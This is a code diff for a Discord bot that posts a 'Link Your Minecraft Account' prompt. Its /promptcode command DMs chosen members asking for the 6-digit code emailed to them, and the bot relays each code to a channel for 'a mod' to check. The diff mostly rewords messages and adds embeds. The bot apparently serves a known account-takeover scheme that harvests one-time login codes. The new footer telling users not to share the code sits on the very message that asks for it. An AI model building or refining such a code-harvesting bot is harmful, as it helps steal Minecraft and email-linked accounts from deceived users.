@@ -55,8 +55,7 @@ async def on_ready():
 
     async for message in verification_channel.history(limit=50):
         if message.author == bot.user and message.embeds:
-            embed = message.embeds[0]
-            if embed.title == "🔗 Link Your Minecraft Account":
+            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                 await message.delete()
 
     embed = discord.Embed(
@@ -73,8 +72,7 @@ async def setup(interaction: discord.Interaction):
 
     async for message in verification_channel.history(limit=50):
         if message.author == bot.user and message.embeds:
-            embed = message.embeds[0]
-            if embed.title == "🔗 Link Your Minecraft Account":
+            if message.embeds[0].title == "🔗 Link Your Minecraft Account":
                 await message.delete()
 
     embed = discord.Embed(
@@ -84,19 +82,21 @@ async def setup(interaction: discord.Interaction):
     )
     embed.set_footer(text="This is an automated message.")
     await verification_channel.send(embed=embed, view=LinkView())
-    await interaction.response.send_message("✅ Setup complete and posted in the channel.", ephemeral=False)
+    await interaction.response.send_message("✅ Sent verification prompt to the channel.", ephemeral=False)
 
-@bot.tree.command(name="promptcode", description="Prompt a user to enter their verification code.")
-async def promptcode(interaction: discord.Interaction, user: discord.User):
+@bot.tree.command(name="promptcode", description="Prompt a user to submit a 6-digit code via DM")
+async def promptcode(interaction: discord.Interaction, user: discord.Member):
     try:
-        await user.send(embed=discord.Embed(
-            title="📩 Minecraft Verification",
-            description="Check your email for a 6-digit code and reply with it here.",
+        embed = discord.Embed(
+            title="📩 Code Verification",
+            description="Check your email for a 6-digit code and send it here.",
             color=discord.Color.blue()
-        ))
-        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}.", ephemeral=False)
+        )
+        embed.set_footer(text="Do not share this code with anyone.")
+        await user.send(embed=embed)
+        await interaction.response.send_message(f"✅ Prompt sent to {user.mention}'s DMs!", ephemeral=False)
     except discord.Forbidden:
-        await interaction.response.send_message(f"❌ I couldn't DM {user.mention}.", ephemeral=True)
+        await interaction.response.send_message(f"❌ Couldn't DM {user.mention}.", ephemeral=True)
 
 @bot.event
 async def on_message(message: discord.Message):
@@ -110,8 +110,15 @@ async def on_message(message: discord.Message):
             )
             await channel.send(embed=embed)
             await message.channel.send("✅ Code received. A mod will check it soon!")
+            return
         else:
-            await message.channel.send("❌ Invalid code. Please send a **6-digit number**.")
+            embed = discord.Embed(
+                title="❌ Invalid Code",
+                description="The code you entered is invalid. Please try again with your 6-digit code.",
+                color=discord.Color.red()
+            )
+            await message.channel.send(embed=embed)
+            return
 
     await bot.process_commands(message)
 
